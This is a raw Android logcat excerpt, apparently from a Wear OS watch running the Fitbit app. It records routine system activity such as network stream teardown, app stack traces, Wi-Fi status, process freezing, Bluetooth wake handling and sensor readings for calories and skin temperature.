06-30 03:15:59.664  8905  8925 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.664  8905  8925 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.664  8905  8925 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.664  8905  8925 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.675  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@8a7e0c4
06-30 03:15:59.687  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@ca702f4
06-30 03:15:59.691  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@2baca1d
06-30 03:15:59.693  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@28b1492
06-30 03:15:59.699  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@1beeb19
06-30 03:16:00.031  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@8101b97
06-30 03:16:00.042  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@50df184
06-30 03:16:00.046  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@69e3d6d
06-30 03:16:00.061  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@df16776
06-30 03:16:00.064  8905  8987 W it.FitbitMobile: Monitor::Inflate: Install failed 0xcc30c828
06-30 03:16:00.216  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@c4ee9ac
06-30 03:16:00.373  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@f132cae
06-30 03:16:00.479  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@db615dc
06-30 03:16:00.533  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@b8fac61
06-30 03:16:00.596  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@6de2447
06-30 03:16:00.676  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@9b9ad9d
06-30 03:16:00.727  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:16:00.727  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:16:00.731  8905  8905 W JobService: onNetworkChanged() not implemented in androidx.work.impl.background.systemjob.SystemJobService. Must override in a subclass.
06-30 03:16:00.734  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:16:00.735  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:16:00.736  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:00.739  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:16:00.739  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:16:00.740  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:16:00.742  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:00.743  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:00.849  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@ba5553f
06-30 03:16:00.857  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@318ae0c
06-30 03:16:00.899   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:16:01.108   721   859 D MCU     : calories_consumer.cc:157         16:30:44.079 Calories OnSample timestamp_ns=57765807586669 total=1.05
06-30 03:16:01.108   721   859 D MCU     : offload_data_provider_app.cc:1190 16:30:44.080 [OffloadDataProvider] Got Calories, total=286.63
06-30 03:16:01.151  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@e6c5510
06-30 03:16:01.152  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@6b4809
06-30 03:16:01.152  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@d969a0e
06-30 03:16:01.152  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@e40c2f
06-30 03:16:01.159  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@4775bc5
06-30 03:16:01.159  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@426491a
06-30 03:16:01.161  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@2af3c4b
06-30 03:16:01.168  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@dcfdce6
06-30 03:16:01.168  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@6b35227
06-30 03:16:01.169  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@e8c0cd4
06-30 03:16:01.171  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@12ce172
06-30 03:16:01.171  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@cf8e9c3
06-30 03:16:01.171  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@d072240
06-30 03:16:01.172  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@5f94579
06-30 03:16:01.175  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@3765f1f
06-30 03:16:01.176  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@43fc035
06-30 03:16:01.177  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@9b32cca
06-30 03:16:01.179  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@72bce3b
06-30 03:16:01.187  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@aff1317
06-30 03:16:01.189  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@1365304
06-30 03:16:01.194  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@57c9b3
06-30 03:16:01.196  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@797ee9
06-30 03:16:01.198  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@99c376e
06-30 03:16:01.199  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@d7b4e0f
06-30 03:16:01.213  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@da8bc2b
06-30 03:16:01.226  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@6f4f007
06-30 03:16:01.518  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@7f17071
06-30 03:16:01.659 15640 15653 W System  : A resource failed to call AbstractCursor.close. 
06-30 03:16:01.660 15640 15653 W System  : A resource failed to call AbstractCursor.close. 
06-30 03:16:02.361  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 5.10625/25000.0, IsHighLux: false
06-30 03:16:02.544  2171 19320 D IpClient/wlan0: interfaceLinkStateChanged: ifindex 26 up
06-30 03:16:03.127  8905  8937 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:16:03.127  8905  8937 E NL_lfx  : adbi: FULL
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:16:03.127  8905  8937 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:16:03.220  1719  1974 D NetworkRequestStateStatsMetrics: Removed nr with ID = 400
06-30 03:16:03.523  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@c678798
06-30 03:16:03.764  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:06.606   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:16:06.615  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:16:06.626  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:16:06.803  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:07.572  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 3.725/25000.0, IsHighLux: false
06-30 03:16:08.051  1719  1914 D ActivityManager: freezing 17828 com.google.android.wearable.protolayout.renderer
06-30 03:16:08.059  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:16:08.059  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:16:08.059  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10117} in 1ms
06-30 03:16:08.208  1719  1914 D ActivityManager: freezing 8905 com.fitbit.FitbitMobile
06-30 03:16:08.213  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 1 for reason 2
06-30 03:16:08.215  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:16:08.216  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:16:08.216  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 2ms
06-30 03:16:08.219  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:16:08.220  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:16:08.221  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={20111} in 5ms
06-30 03:16:08.222  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:16:08.222  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:16:08.223  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 2ms
06-30 03:16:08.901   396 20576 I keystore2: system/security/keystore2/watchdog/src/lib.rs:371 - Watchdog thread idle -> terminating. Have a great day.
06-30 03:16:09.837  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:10.614   721   859 D MCU     : usf_sensor.cc:1920               16:30:53.803 [USF] Received start sampling request for Skin temperature sensor (active:1).
06-30 03:16:10.614   721   859 D MCU     : device.cc:154                    16:30:53.804 AS6221Device Set conversion timer: 60000000 ns
06-30 03:16:10.614   721   859 D MCU     : device.cc:173                    16:30:53.804 AS6221Device Set sampling timer:180000000
06-30 03:16:10.615   721   859 D MCU     : skin_temperature_manager.cc:333  16:30:53.867 [SkinTemperature] [Record Processing Incomplete] Processed 0 temperature samples.
06-30 03:16:12.881  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:12.966  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.00125/25000.0, IsHighLux: false
06-30 03:16:12.983  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.9258271/25000.0, IsHighLux: false
06-30 03:16:13.165  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 1.38125/25000.0, IsHighLux: false
06-30 03:16:15.125   721   859 D MCU     : telemetry_producers.cc:42        16:30:58.721 [TelemetryProducers] Deep sleep: 89%
06-30 03:16:15.126   721   859 D MCU     : telemetry_producers.cc:64        16:30:58.721 [TelemetryProducers] Heap high watermark (bytes): 502152 Current (bytes): 448768
06-30 03:16:15.942  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:18.378  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 6.4874997/25000.0, IsHighLux: false
06-30 03:16:18.668   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:16:18.992  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:16:18.992  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:16:18.992  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:19.002  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:16:19.002  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:16:19.002  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:16:19.003  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:16:19.003  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:16:19.007  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:19.007  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:22.041  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:22.042  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:16:22.042  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:16:22.048  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:16:22.049  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:16:22.049  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:16:22.050  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:16:22.052  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:16:22.053  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:22.054  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:22.325  2076  2088 I .wearable.sysui: NativeAlloc concurrent mark compact GC freed 3146KB AllocSpace bytes, 2(32KB) LOS objects, 89% free, 13MB/128MB, paused 1.179ms,4.935ms total 280.519ms
06-30 03:16:23.775  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 2.7625/25000.0, IsHighLux: false
06-30 03:16:25.078  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:28.125  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:30.054   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:16:30.062  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:16:30.072  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:16:31.185  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:31.627   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:16:34.222  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:35.377  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.00125/25000.0, IsHighLux: false
06-30 03:16:35.991  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 1.3261422/25000.0, IsHighLux: false
06-30 03:16:37.281  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:16:37.282  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:16:37.287  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:37.291  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:16:37.292  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:16:37.292  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:16:37.293  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:16:37.295  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:16:37.297  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:37.297  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:16:40.338  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:42.781   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:16:43.139   721   859 D MCU     : site_data_provider.cc:220        16:31:27.279 [SiteDataProvider] Flushing 1 GROK records
06-30 03:16:43.139   721   859 D MCU     : site_data_provider.cc:220        16:31:27.279 [SiteDataProvider] Flushing 1 GROK records
06-30 03:16:43.381  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:46.431  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:46.829   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:16:47.089  2817  2828 W adsp_wdog: vendor/qcom/proprietary/monaco/adsprpc/src/fastrpc_apps_user.c:1425:Warning: remote_handle_invoke: Non-domain usage of FastRPC will be deprecated, use domains to offload to DSP using FastRPC
06-30 03:16:47.096  2817  2828 I adsp_wdog: rpcversion_getSerialNum() returned: 9d5cd6d4
06-30 03:16:47.286  1719  1736 I system_server: Background concurrent mark compact GC freed 3797KB AllocSpace bytes, 0(0B) LOS objects, 87% free, 31MB/256MB, paused 4.212ms,6.890ms total 454.819ms
06-30 03:16:49.489  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:50.867  1628  1654 I pixel-thermal: CDEV log 
06-30 03:16:52.536  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:53.479   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:16:53.495  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:16:53.507  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:16:53.774  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 3.75125/25000.0, IsHighLux: false
06-30 03:16:55.595  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:16:56.869   853   853 D vendor.qti.bluetooth@1.0-wake_lock: Acquire wakelock is acquired 
06-30 03:16:56.870   853   861 D vendor.qti.bluetooth@1.0-ibs_handler: SerialClockVote: vote for UART CLK ON
06-30 03:16:56.878   853   861 D vendor.qti.bluetooth@1.0-uart_transport: ClockOperation: USERIAL_OP_CLK_ON - after sys fs write-ret:4
06-30 03:16:56.878   853   861 D vendor.qti.bluetooth@1.0-uart_transport: SocRxDWakeup: Flow off->Change UART baudrate to 38.4kbs->send 0x00->Change UART baudrate to max->Flow on
06-30 03:16:56.878   853   861 I vendor.qti.bluetooth@1.0-uart_transport: ## userial_vendor_ioctl: UART Flow Off 
06-30 03:16:56.880   853   861 I vendor.qti.bluetooth@1.0-uart_transport: ## userial_vendor_set_baud: 17
06-30 03:16:56.890   853   861 I vendor.qti.bluetooth@1.0-uart_transport: SetBaudRate: in BOTHER
06-30 03:16:56.891   853   861 I vendor.qti.bluetooth@1.0-uart_transport: ## userial_vendor_ioctl: UART Flow On 
06-30 03:16:56.891   853   861 I vendor.qti.bluetooth@1.0-ibs_handler: DeviceWakeUp: Writing IBS_WAKE_IND
06-30 03:16:56.891   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_WAKE_ACK: 0xFC
06-30 03:16:56.891   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Signal wack_cond_
06-30 03:16:56.891   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_WAKE_ACK: 0xFC
06-30 03:16:56.891   853   861 D vendor.qti.bluetooth@1.0-ibs_handler: DeviceWakeUp: Unblocked from waiting for FC, pthread_cond_timedwait ret = 0
06-30 03:16:56.892   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Signal wack_cond_
06-30 03:16:56.892   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_WAKE_IND: 0xFD
06-30 03:16:56.892   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Writing IBS_WAKE_ACK
06-30 03:16:56.934   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_SLEEP_IND: 0xFE
06-30 03:16:57.894   853  2607 I vendor.qti.bluetooth@1.0-ibs_handler: DeviceSleep: TX Awake, Sending SLEEP_IND
06-30 03:16:57.894   853  2607 D vendor.qti.bluetooth@1.0-ibs_handler: SerialClockVote: vote for UART CLK OFF
06-30 03:16:57.895   853  2607 D vendor.qti.bluetooth@1.0-uart_transport: ClockOperation: USERIAL_OP_CLK_OFF - after sys fs write-ret:4
06-30 03:16:58.046   853  2495 D vendor.qti.bluetooth@1.0-wake_lock: Release wakelock is released 
06-30 03:16:58.640  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:00.371  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.00125/25000.0, IsHighLux: false
06-30 03:17:00.378  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.66369605/25000.0, IsHighLux: false
06-30 03:17:00.905   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:17:01.049  1435  1435 I android.hardware.health-service.sw5100: Recording a sample at time 57840
06-30 03:17:01.050  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:17:01.064  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:17:01.136   721   859 D MCU     : calories_consumer.cc:157         16:31:45.988 Calories OnSample timestamp_ns=57825807861328 total=1.05
06-30 03:17:01.137   721   859 D MCU     : offload_data_provider_app.cc:1190 16:31:45.989 [OffloadDataProvider] Got Calories, total=287.69
06-30 03:17:01.688  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:01.734   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:17:01.919  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 0 for reason 2
06-30 03:17:01.920  1719  1760 D ActivityManager: sync unfroze 8905 com.fitbit.FitbitMobile for 3
06-30 03:17:02.174  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 3.6999996/25000.0, IsHighLux: false
06-30 03:17:03.035  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 1 for reason 0
06-30 03:17:04.724  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:04.725  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:04.727  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:04.733  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:04.734  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:04.734  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:04.736  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:04.736  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:04.737  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:04.738  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:07.043  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:17:07.046  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:17:07.046  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 5ms
06-30 03:17:07.048  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:17:07.049  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:17:07.049  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={20111} in 2ms
06-30 03:17:07.053  1719  1914 D ActivityManager: freezing 8905 com.fitbit.FitbitMobile
06-30 03:17:07.054  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 1 for reason 2
06-30 03:17:07.058  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:17:07.059  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:17:07.059  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 2ms
06-30 03:17:07.782  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:07.782  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:07.786  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:07.794  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:07.797  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:07.797  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:07.798  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:07.799  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:07.800  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:07.800  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:10.638   721   859 D MCU     : usf_sensor.cc:1920               16:31:55.714 [USF] Received start sampling request for Skin temperature sensor (active:1).
06-30 03:17:10.639   721   859 D MCU     : device.cc:154                    16:31:55.715 AS6221Device Set conversion timer: 60000000 ns
06-30 03:17:10.639   721   859 D MCU     : device.cc:173                    16:31:55.715 AS6221Device Set sampling timer:180000000
06-30 03:17:10.639   721   859 D MCU     : skin_temperature_manager.cc:333  16:31:55.778 [SkinTemperature] [Record Processing Incomplete] Processed 0 temperature samples.
06-30 03:17:10.841  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
